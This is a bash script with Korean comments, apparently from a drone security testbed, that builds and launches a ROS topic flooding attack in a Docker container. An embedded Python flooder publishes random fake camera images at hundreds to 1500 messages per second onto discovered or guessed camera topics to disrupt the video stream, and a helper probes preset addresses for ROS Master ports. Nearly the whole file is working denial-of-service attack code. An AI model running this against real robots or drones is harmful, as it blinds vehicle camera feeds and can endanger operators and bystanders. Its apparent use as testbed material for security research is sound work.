#!/bin/bash
# camera_ros_flood_attack.sh - 카메라 피드 ROS 토픽 플러딩 공격
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/camera_ros_flood_attack.sh
# Purpose: ROS 토픽을 대량의 가짜 카메라 데이터로 플러딩하여 RTSP 스트림 방해

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Camera Feed ROS Topic Flooding Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}    Camera Feed ROS Topic Flooding       ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_ros_flood_attack() {
    local ros_master_host=${1:-"10.13.0.5"}
    local ros_master_port=${2:-"11311"}
    local flood_mode=${3:-"camera_only"}
    local duration=${4:-60}
    
    log_info "Starting camera feed ROS topic flooding attack"
    log_info "ROS Master: ${ros_master_host}:${ros_master_port}"
    log_info "Flood mode: ${flood_mode}"
    log_info "Duration: ${duration} seconds"
    
    # Docker 환경에서 ROS 공격 실행
    setup_and_run_ros_attack "$ros_master_host" "$ros_master_port" "$flood_mode" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "Camera ROS topic flooding attack completed successfully"
        return 0
    else
        log_error "Camera ROS topic flooding attack failed"
        return 1
    fi
}

setup_and_run_ros_attack() {
    local ros_master_host="$1"
    local ros_master_port="$2"
    local flood_mode="$3"
    local duration="$4"
    
    log_info "Setting up ROS attack environment..."
    
    # ROS 공격 스크립트 생성
    create_ros_flood_script
    
    # Docker 컨테이너 설정 및 공격 실행
    local container_name="ros_flood_attacker_$(date +%s)"
    local network_name="simulator"
    local container_ip="10.13.0.10"
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_name="host"
        container_ip="192.168.13.10"
    fi
    
    log_info "Creating attack container: $container_name"
    
    # Docker 컨테이너 실행
    docker run -d \
        --name "$container_name" \
        --network="$network_name" \
        --ip="$container_ip" \
        -v "$(pwd)/ros_flood_attack.py:/tmp/ros_flood_attack.py" \
        ros:noetic-ros-base \
        bash -c "
        export ROS_MASTER_URI=http://${ros_master_host}:${ros_master_port} && \
        export ROS_IP=${container_ip} && \
        source /opt/ros/noetic/setup.bash && \
        apt-get update >/dev/null 2>&1 && \
        apt-get install -y python3-pip >/dev/null 2>&1 && \
        pip3 install numpy >/dev/null 2>&1 && \
        python3 /tmp/ros_flood_attack.py $flood_mode $duration" \
        > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        log_success "Attack container started: $container_name"
        
        # 공격 진행 모니터링
        monitor_attack_progress "$container_name" "$duration"
        
        # 컨테이너 정리
        docker rm -f "$container_name" >/dev/null 2>&1
        rm -f ros_flood_attack.py
        
        return 0
    else
        log_error "Failed to start attack container"
        rm -f ros_flood_attack.py
        return 1
    fi
}

create_ros_flood_script() {
    log_info "Creating ROS topic flooding script..."
    
    cat > ros_flood_attack.py << 'PYEOF'
#!/usr/bin/env python3

import rospy
from sensor_msgs.msg import Image, CompressedImage
from std_msgs.msg import Header
import numpy as np
import sys
import time
import threading
import signal

class ROSTopicFlooder:
    def __init__(self):
        self.running = True
        self.publishers = {}
        self.stats = {
            'messages_sent': 0,
            'start_time': time.time(),
            'topics_flooded': 0
        }
        
        # 다양한 카메라 토픽들
        self.camera_topics = [
            ('/webcam/image_raw', 'sensor_msgs/Image'),
            ('/camera/image_raw', 'sensor_msgs/Image'),
            ('/camera/image_compressed', 'sensor_msgs/CompressedImage'),
            ('/usb_cam/image_raw', 'sensor_msgs/Image'),
            ('/front_camera/image_raw', 'sensor_msgs/Image'),
            ('/rear_camera/image_raw', 'sensor_msgs/Image'),
            ('/left_camera/image_raw', 'sensor_msgs/Image'),
            ('/right_camera/image_raw', 'sensor_msgs/Image'),
            ('/gimbal_camera/image_raw', 'sensor_msgs/Image'),
            ('/thermal_camera/image_raw', 'sensor_msgs/Image')
        ]
        
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        print(f"\n[!] Attack interrupted. Messages sent: {self.stats['messages_sent']}")
        self.stop_flooding()
    
    def init_ros_node(self):
        """ROS 노드 초기화"""
        try:
            rospy.init_node('camera_flooder', anonymous=True)
            print("[+] ROS node initialized")
            return True
        except Exception as e:
            print(f"[-] ROS node initialization failed: {e}")
            return False
    
    def discover_active_topics(self):
        """현재 활성화된 토픽 발견"""
        try:
            print("[*] Discovering active topics...")
            
            all_topics = rospy.get_published_topics()
            camera_topics = []
            other_topics = []
            
            for topic_name, topic_type in all_topics:
                if any(keyword in topic_name.lower() for keyword in 
                       ['camera', 'image', 'webcam', 'video', 'cam']):
                    camera_topics.append((topic_name, topic_type))
                else:
                    other_topics.append((topic_name, topic_type))
            
            print(f"[+] Total topics found: {len(all_topics)}")
            print(f"[+] Camera-related topics: {len(camera_topics)}")
            
            if camera_topics:
                print("[*] Camera topics discovered:")
                for topic, msg_type in camera_topics:
                    print(f"    └─ {topic} ({msg_type})")
            
            return camera_topics, other_topics
            
        except Exception as e:
            print(f"[-] Topic discovery failed: {e}")
            return [], []
    
    def create_fake_image_message(self, width=640, height=480):
        """가짜 이미지 메시지 생성"""
        img = Image()
        img.header = Header()
        img.header.stamp = rospy.Time.now()
        img.header.frame_id = "flooded_camera_frame"
        
        img.height = height
        img.width = width
        img.encoding = "rgb8"
        img.is_bigendian = 0
        img.step = width * 3
        
        # 대용량 랜덤 이미지 데이터 생성
        img.data = np.random.randint(0, 255, width * height * 3, dtype=np.uint8).tobytes()
        
        return img
    
    def create_fake_compressed_image(self):
        """가짜 압축 이미지 메시지 생성"""
        comp_img = CompressedImage()
        comp_img.header = Header()
        comp_img.header.stamp = rospy.Time.now()
        comp_img.header.frame_id = "flooded_camera_frame"
        comp_img.format = "jpeg"
        
        # 큰 더미 데이터 생성 (가짜 JPEG)
        comp_img.data = np.random.randint(0, 255, 100000, dtype=np.uint8).tobytes()
        
        return comp_img
    
    def setup_publisher(self, topic_name, msg_type):
        """토픽 퍼블리셔 설정"""
        try:
            if msg_type == 'sensor_msgs/Image':
                pub = rospy.Publisher(topic_name, Image, queue_size=1000)
            elif msg_type == 'sensor_msgs/CompressedImage':
                pub = rospy.Publisher(topic_name, CompressedImage, queue_size=1000)
            else:
                print(f"[-] Unsupported message type: {msg_type}")
                return None
            
            self.publishers[topic_name] = {
                'publisher': pub,
                'msg_type': msg_type,
                'messages_sent': 0
            }
            
            print(f"[+] Publisher setup for {topic_name}")
            return pub
            
        except Exception as e:
            print(f"[-] Publisher setup failed for {topic_name}: {e}")
            return None
    
    def flood_single_topic(self, topic_name, msg_type, rate_hz=1000, duration=60):
        """단일 토픽 플러딩"""
        print(f"[*] Flooding topic: {topic_name} at {rate_hz} Hz for {duration}s")
        
        publisher = self.setup_publisher(topic_name, msg_type)
        if not publisher:
            return
        
        rate = rospy.Rate(rate_hz)
        start_time = time.time()
        local_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            try:
                if msg_type == 'sensor_msgs/Image':
                    msg = self.create_fake_image_message()
                elif msg_type == 'sensor_msgs/CompressedImage':
                    msg = self.create_fake_compressed_image()
                else:
                    continue
                
                publisher.publish(msg)
                local_count += 1
                self.stats['messages_sent'] += 1
                
                if local_count % 100 == 0:
                    elapsed = time.time() - start_time
                    rate_actual = local_count / elapsed if elapsed > 0 else 0
                    print(f"[*] {topic_name}: {local_count} msgs, {rate_actual:.1f} Hz")
                
                rate.sleep()
                
            except Exception as e:
                print(f"[-] Error flooding {topic_name}: {e}")
                break
        
        print(f"[+] Completed flooding {topic_name}: {local_count} messages sent")
    
    def flood_multiple_topics(self, topics, rate_hz=500, duration=60):
        """다중 토픽 동시 플러딩"""
        print(f"[*] Starting multi-topic flooding: {len(topics)} topics")
        
        threads = []
        
        for topic_name, msg_type in topics:
            thread = threading.Thread(
                target=self.flood_single_topic,
                args=(topic_name, msg_type, rate_hz, duration)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)  # 스레드 시작 간격
        
        # 모든 스레드 완료 대기
        for thread in threads:
            thread.join()
        
        self.stats['topics_flooded'] = len(topics)
    
    def flood_camera_only(self, duration=60):
        """카메라 토픽만 플러딩"""
        print("[*] Camera-only flooding mode")
        
        # 기본 카메라 토픽들 사용
        active_cameras, _ = self.discover_active_topics()
        
        if active_cameras:
            print(f"[*] Flooding {len(active_cameras)} discovered camera topics")
            self.flood_multiple_topics(active_cameras, 800, duration)
        else:
            print("[*] No active camera topics found, using default topics")
            self.flood_multiple_topics(self.camera_topics[:5], 600, duration)
    
    def flood_aggressive(self, duration=60):
        """공격적 플러딩 모드"""
        print("[*] Aggressive flooding mode")
        
        active_cameras, other_topics = self.discover_active_topics()
        
        # 카메라 토픽 + 기본 토픽들 모두 공격
        all_targets = active_cameras + self.camera_topics[:8]
        
        # 중복 제거
        unique_targets = list(set(all_targets))
        
        print(f"[*] Aggressive flooding: {len(unique_targets)} total topics")
        self.flood_multiple_topics(unique_targets, 1000, duration)
    
    def flood_discovery_mode(self, duration=60):
        """발견된 모든 토픽 플러딩"""
        print("[*] Discovery flooding mode")
        
        active_cameras, other_topics = self.discover_active_topics()
        
        if active_cameras:
            self.flood_multiple_topics(active_cameras, 1500, duration)
        else:
            print("[!] No camera topics discovered, creating new topics")
            self.flood_multiple_topics(self.camera_topics, 1200, duration)
    
    def monitor_system_impact(self, duration=30):
        """시스템 영향 모니터링"""
        print(f"[*] Monitoring system impact for {duration} seconds...")
        
        start_time = time.time()
        
        while time.time() - start_time < duration:
            try:
                current_topics = rospy.get_published_topics()
                elapsed = time.time() - self.stats['start_time']
                msg_rate = self.stats['messages_sent'] / elapsed if elapsed > 0 else 0
                
                print(f"[*] System status: {len(current_topics)} topics, {msg_rate:.1f} msg/s")
                
                # ROS Master 응답성 테스트
                try:
                    rospy.get_master().getSystemState()
                    print("[+] ROS Master responsive")
                except:
                    print("[!] ROS Master unresponsive")
                
                time.sleep(5)
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
    
    def stop_flooding(self):
        """플러딩 중지"""
        self.running = False
        
        elapsed = time.time() - self.stats['start_time']
        avg_rate = self.stats['messages_sent'] / elapsed if elapsed > 0 else 0
        
        print("\n[+] Flooding attack completed")
        print(f"    Total messages sent: {self.stats['messages_sent']}")
        print(f"    Topics flooded: {self.stats['topics_flooded']}")
        print(f"    Duration: {elapsed:.1f} seconds")
        print(f"    Average rate: {avg_rate:.1f} messages/second")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ros_flood_attack.py <mode> [duration]")
        print("Modes: camera_only, aggressive, discovery, monitor")
        sys.exit(1)
    
    mode = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    
    flooder = ROSTopicFlooder()
    
    if not flooder.init_ros_node():
        print("[-] Failed to initialize ROS node")
        sys.exit(1)
    
    try:
        print(f"[*] Starting ROS topic flooding attack")
        print(f"[*] Mode: {mode}, Duration: {duration} seconds")
        print(f"[*] Press Ctrl+C to stop")
        
        if mode == "camera_only":
            flooder.flood_camera_only(duration)
        elif mode == "aggressive":
            flooder.flood_aggressive(duration)
        elif mode == "discovery":
            flooder.flood_discovery_mode(duration)
        elif mode == "monitor":
            flooder.monitor_system_impact(duration)
        else:
            print(f"[-] Unknown mode: {mode}")
            sys.exit(1)
        
        flooder.stop_flooding()
        
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        flooder.stop_flooding()
    except Exception as e:
        print(f"[-] Attack failed: {e}")
        flooder.stop_flooding()
        sys.exit(1)

if __name__ == "__main__":
    main()
PYEOF
    
    log_success "ROS flood script created"
}

monitor_attack_progress() {
    local container_name="$1"
    local duration="$2"
    
    log_info "Monitoring attack progress for ${duration} seconds..."
    
    local elapsed=0
    local check_interval=10
    
    while [ $elapsed -lt $duration ]; do
        sleep $check_interval
        elapsed=$((elapsed + check_interval))
        
        # 컨테이너 상태 확인
        if docker ps --format "table {{.Names}}" | grep -q "$container_name"; then
            echo -e "${GREEN}[*] Attack progress: ${elapsed}/${duration}s - Container running${NC}"
        else
            echo -e "${RED}[!] Attack container stopped unexpectedly${NC}"
            break
        fi
        
        # 컨테이너 로그 샘플 출력
        local recent_logs=$(docker logs --tail 5 "$container_name" 2>/dev/null | tail -2)
        if [ -n "$recent_logs" ]; then
            echo -e "${CYAN}    Recent activity: $recent_logs${NC}"
        fi
    done
    
    echo -e "${YELLOW}[*] Attack duration completed${NC}"
    
    # 최종 로그 출력
    echo -e "${CYAN}=== Final Attack Statistics ===${NC}"
    docker logs --tail 10 "$container_name" 2>/dev/null | grep -E "(messages sent|Topics flooded|Average rate)" || echo "No statistics available"
}

# ROS Master 스캔
scan_ros_masters() {
    log_info "Scanning for ROS Master services..."
    
    local common_targets=(
        "10.13.0.5:11311"
        "192.168.13.5:11311"
        "127.0.0.1:11311"
        "10.13.0.3:11311"
        "192.168.1.100:11311"
    )
    
    local found_masters=()
    
    for target in "${common_targets[@]}"; do
        local ip=$(echo "$target" | cut -d':' -f1)
        local port=$(echo "$target" | cut -d':' -f2)
        
        if timeout 3 nc -z "$ip" "$port" 2>/dev/null; then
            found_masters+=("$target")
            echo -e "${GREEN}Found ROS Master: $target${NC}"
        fi
    done
    
    if [ ${#found_masters[@]} -eq 0 ]; then
        echo -e "${YELLOW}No live ROS Masters found, using simulation mode${NC}"
        return 1
    fi
    
    return 0
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("python3" "docker")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        exit 1
    fi
    
    # Docker 서비스 확인
    if ! docker ps >/dev/null 2>&1; then
        log_error "Docker is not running or accessible"
        echo "Start Docker with: sudo systemctl start docker"
        exit 1
    fi
    
    # ROS Docker 이미지 확인
    if ! docker images | grep -q "ros:noetic"; then
        log_info "Pulling ROS Noetic Docker image..."
        docker pull ros:noetic-ros-base >/dev/null 2>&1
    fi
    
    # 사용자 옵션 처리
    local ros_master_host="${1:-10.13.0.5}"
    local ros_master_port="${2:-11311}"
    local flood_mode="${3:-camera_only}"
    local duration="${4:-60}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [ros_master_host] [ros_master_port] [flood_mode] [duration]"
        echo "  ros_master_host : ROS Master IP address (default: 10.13.0.5)"
        echo "  ros_master_port : ROS Master port (default: 11311)"
        echo "  flood_mode      : Flooding strategy (default: camera_only)"
        echo "  duration        : Attack duration in seconds (default: 60)"
        echo ""
        echo "Flood modes:"
        echo "  camera_only     : Target only camera-related topics"
        echo "  aggressive      : High-rate flooding of multiple topics"
        echo "  discovery       : Flood all discovered camera topics"
        echo "  monitor         : Monitor system impact without flooding"
        echo ""
        echo "Examples:"
        echo "  $0                                    # Basic camera flooding"
        echo "  $0 10.13.0.5 11311 aggressive 120   # Aggressive mode for 120s"
        echo "  $0 192.168.13.5 11311 discovery 90  # Discovery mode for 90s"
        echo "  $0 127.0.0.1 11311 monitor 30       # Monitor mode for 30s"
        echo ""
        echo "Target examples:"
        echo "  10.13.0.5:11311     - Docker bridge network"
        echo "  192.168.13.5:11311  - WiFi network"
        echo "  127.0.0.1:11311     - Local ROS Master"
        exit 0
    fi
    
    # ROS Master 스캔 (정보용)
    scan_ros_masters
    
    # 공격 실행
    execute_ros_flood_attack "$ros_master_host" "$ros_master_port" "$flood_mode" "$duration"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi